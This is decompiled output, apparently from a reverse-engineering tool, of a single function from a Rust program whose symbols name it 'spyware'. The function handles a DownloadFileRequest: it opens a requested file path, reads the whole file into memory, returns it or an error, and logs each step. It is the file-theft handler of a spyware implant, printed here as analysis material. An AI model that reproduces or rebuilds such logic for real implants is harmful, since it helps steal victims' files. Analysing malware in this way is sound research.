
  fn spyware::actions::basic_info::download_file_message::h8a802bf593e1dd2f(arg1: *mut i128, arg2: *mut i64) -> *mut i128

{
    let mut var_c0: *const i8;
    let mut var_98: *mut *mut [i8; 0x47];
    let mut var_88: *mut i64;
    let mut var_58: *mut i64;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
    {
        var_58 = arg2;
        let var_50_1: fn(arg1: *mut c_void, arg2: *mut i64) -> i64 =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
        var_98 = &data_4b9810;
        let var_90_1: i64 = 2;
        let var_78_1: i64 = 0;
        var_88 = &var_58;
        let var_80_1: i64 = 1;
        let rax_1: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9860);
        var_c0 = "spyware::actions::basic_infoHand…";
        let var_b8_1: i64 = 0x1c;
        let var_b0_1: *const i8 = "spyware::actions::basic_infoHand…";
        let var_a8_1: i64 = 0x1c;
        let var_a0_1: i64 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_98, 4, &var_c0);
    }
    
    let mut var_68: i8;
    let mut rdx_2: i64 = std::fs::File::open::h9ff4b407758639b8(&var_68, arg2);
    
    if (var_68 & 1) == 0
    {
        let var_64: i32;
        var_c0 = var_64;
        var_98 = nullptr;
        let var_90_3: i64 = 1;
        let var_88_1: i64 = 0;
        let mut rax_7: i8;
        let mut rdx_4: i64;
        rax_7 = _$LT$std..fs..File$u20$as$u20$std..io..Read$GT$::read_to_end::hc5ce334212601c81(
            &var_c0, &var_98);
        core::result::Result$LT$T$C$E$GT$::unwrap::hb253015956d15545(rax_7, rdx_4);
        arg1[1] = var_88_1;
        *arg1 = var_98;
        *arg1.byte_offset(0x18) = -0x8000000000000000;
        core::ptr::drop_in_place$LT$std..fs..File$GT$::hb5daeec03bf79b51(var_c0);
    }
    else
    {
        let var_60: i64;
        let mut r15_1: i64 = var_60;
        let mut var_c8: i64 = r15_1;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
        {
            let mut var_38: ();
            _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h89fbb585ce883e17(
                &var_38, &var_c8, rdx_2);
            var_58 = arg2;
            let var_50_2: fn(arg1: *mut c_void, arg2: *mut i64) -> i64 = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            let var_48_1: *mut c_void = &var_38;
            let var_40_1: fn(arg1: *mut c_void, arg2: *mut i64) -> i64 = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            var_98 = &data_4b9830;
            let var_90_2: i64 = 3;
            let var_78_2: i64 = 0;
            var_88 = &var_58;
            let var_80_2: i64 = 2;
            let rax_3: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9890);
            var_c0 = "spyware::actions::basic_infoHand…";
            let var_b8_2: i64 = 0x1c;
            let var_b0_2: *const i8 = "spyware::actions::basic_infoHand…";
            let var_a8_2: i64 = 0x1c;
            let var_a0_2: i64 = rax_3;
            log::__private_api::log::h13afddf373bd7d7f(&var_98, 1, &var_c0);
            rdx_2 =
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_38);
            r15_1 = var_c8;
        }
        
        var_c0 = nullptr;
        let var_b8_3: i64 = 1;
        let var_b0_3: i64 = 0;
        std::io::error::repr_bitpacked::decode_repr::h049ae64b4e643a43(&var_98, r15_1);
        let r15_2: i8 = var_98;
        let rbp_1: i32 = *var_98[4];
        _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h89fbb585ce883e17(
            &var_98, &var_c8, rdx_2);
        *arg1.byte_offset(0x28) = var_88;
        *arg1.byte_offset(0x18) = var_98;
        arg1[1] = var_b0_3;
        *arg1 = var_c0;
        arg1[3] = (0 - 0) | rbp_1;
        core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_c8);
    }
    
    core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(arg2);
    arg1
}
